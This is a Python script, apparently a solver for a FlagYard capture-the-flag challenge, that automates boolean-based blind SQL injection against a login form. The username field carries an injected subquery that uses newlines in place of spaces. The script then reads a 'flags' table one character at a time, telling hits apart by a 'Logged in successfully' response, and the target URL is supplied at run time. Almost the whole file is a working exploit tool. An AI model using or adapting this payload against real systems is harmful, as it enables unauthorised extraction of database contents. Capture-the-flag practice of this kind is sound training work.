import requests
import itertools
import time
import sys
import threading

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}'

session = requests.Session()
print('''
               #########               
            ###############            
         #####################         
      ###########################      
   ##############     ##############   
 #############           ############# 
###########                 ###########
########                       ########
#######                         #######
#######                         #######
#######                         #######
#######                         #######
#######                         #######
#######                         #######
#######                         #######
########                       ########
###########                 ###########
 #############           ############# 
   ##############     ##############   
      ###########################      
         #####################         
            ###############            
               #########               

Welcome To FlagYard Space CTF Tool    
''')
print("[+] Please enter the URL:")
url = input("# ")
print("=> URL : ", url)
print("[+] Do you want to see the program trying to display flag? (y/n) ")
debug = input("# ")
while debug not in ["y", "n"]:
    print("[+] Please enter 'y' or 'n'")
    debug = input("# ")

def loading_animation():
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    while getattr(threading.current_thread(), "do_run", True):
        sys.stdout.write(f'\rNow we are getting the flag, please wait {next(spinner)}')
        sys.stdout.flush()
        time.sleep(0.1)

if debug == "n":
    loading_thread = threading.Thread(target=loading_animation)
    loading_thread.start()

num = 1
text = ''
flag = True

while flag:
    flag = False  # تعيين الفلاق إلى False افتراضياً حتى يتم العثور على حرف جديد
    for char in characters:
        data = {
            "username": f"'or\n(select\n1\nfrom\nflags\nwhere\nsubstring(flag,{num},1)='{char}'\nlimit\n1)=1\n/*",
            "password": "a"
        }
        try:
            response = session.post(url, data=data)
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            continue
        
        if "Logged in successfully" in response.text:
            text += char
            sys.stdout.write(f"\r{text}")
            sys.stdout.flush()
            num += 1
            flag = True
            break

if debug == "n":
    loading_thread.do_run = False
    loading_thread.join()

# عرض العلم بدون تكرار "FlagY{"
print(f"\nFinal flag: {text}")
print("Done")
